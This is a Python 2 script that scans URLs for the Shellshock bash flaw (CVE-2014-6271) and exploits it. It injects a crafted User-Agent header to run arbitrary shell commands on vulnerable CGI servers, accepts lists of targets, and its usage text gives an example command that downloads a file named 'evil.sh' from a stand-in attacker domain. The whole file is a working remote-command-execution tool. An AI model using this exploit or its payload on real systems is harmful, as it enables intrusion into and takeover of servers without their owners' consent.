
import urllib2
import argparse
try:
    #Setup list for multiple target scan
    targets = []

    # Check url
    def checkurl(url):
        if url[:8] != "https://" and url[:7] != "http://":
            print '[!] URL Must be complete. ie https://url or http://'
            return False
        else:
            return url


    #Check for vulnerabilty
    def checkvuln1(url):
        print '\n[+] Scanning %s' % url.strip('\n')
        try:
            headers = {"User-Agent": "() { :;}; /bin/bash -c 'echo vulnerable'"}
            request = urllib2.Request(url, None, headers)
            response = urllib2.urlopen(request, timeout=3)
            #print response.info()
            if 'vulnerable' in response.info():
                print '[+] Target Vulnerable: %s\n' % url.strip('\n')
                targets.append(url)
                return True
            else:
                print '[!] %s NOT vulnerable\n' % url.strip('\n')
                return False
        except urllib2.HTTPError, e:
            #print e.info()
            if e.code == 400:
                print '[!] Page not found'
                return False
            else:
                print '[!] HTTP Error! Response code: %s' % e.code
                return False
        except urllib2.URLError:
            print '[!] Connection Error! Server timeout or connection failed.'
            return False
        except KeyboardInterrupt:
            print "\nKeyboard interrupt caught..."
            q = raw_input('Would you like to quit (q) or move to next target (n) if applicable? (type q or n): ')
            if q.lower() == 'q':
                exit(1)
            elif q.lower() == 'n':
                pass
            else:
                print "Input not recognized.. moving to next target! "
                print "(Type 'q' to quit at the ctrl-C prompt)"
                pass
        except:
            print '[!] Error! Connection probably reset by peer'
            return False

    def cmdinjection(url,cmd):
        try:
            uagent = { 'User-Agent': '() { :;}; /bin/bash -c "%s"' % cmd}
            response = urllib2.Request(url, None, uagent)
            content = urllib2.urlopen(response).read()
            print '[+] Command sent: %s' % cmd
            print '[+] Result: %s' % content
        except urllib2.HTTPError, e:
            if e.code == 500:
                print '[!] '+cmd+' command sent!!!'
            else:
                print '[!] command not sent :('
        except urllib2.URLError:
            print '[X] Connection Error'
        except KeyboardInterrupt:
            print "\nKeyboard interrupt caught.. exiting!"
            exit(1)

    parser = argparse.ArgumentParser(description='Scan for CVE-2014-6271 codenamed ShellShock',
                                     usage='%(prog)s -t http://target.com/cgi-bin/login '
                                           '-c "curl -s http://mydomain.com/evil -o evil.sh"')
    parser.add_argument('-t', '--target', dest='target', help="Single URL to test for shellshock (should be cgi)")
    parser.add_argument('-T', '--target-list', dest='targetlist', help="List of URLs to test for shellshock (should be cgi)")
    parser.add_argument('-c', '--cmd', dest='cmd', help="Command to run on vulnerable server")
    parser.add_argument('-s', '--scan', default=False, action="store_true", help="Scan for the vulnerability only")
    args = parser.parse_args()

    target = args.target
    targetlist = args.targetlist
    command = args.cmd
    scan = args.scan


    # Check args and scan
    if not target and not targetlist:
        print '[!] Error! You must specify a target with -t or a target list with -T'
        exit(1)

    if not scan and not command:
        print '[!] Error you need to either scan the url with -s or specify a command with -c'
        exit(1)


    #main
    if target:
        url = checkurl(target)
        if url:
            if scan:
                checkvuln1(url)
            else:
                cmdinjection(url, command)
    elif targetlist:
        with open(targetlist, 'r') as f:
            for t in f:
                url = checkurl(t)
                if url:
                    if scan:
                        checkvuln1(url)
                    else:
                        cmdinjection(url, command)
    if targets:
        print "Printing a list of targets: "
        count = 1
        for t in targets:
            print "%d ) %s" % (count, t)
            count += 1
except KeyboardInterrupt:
    exit(1)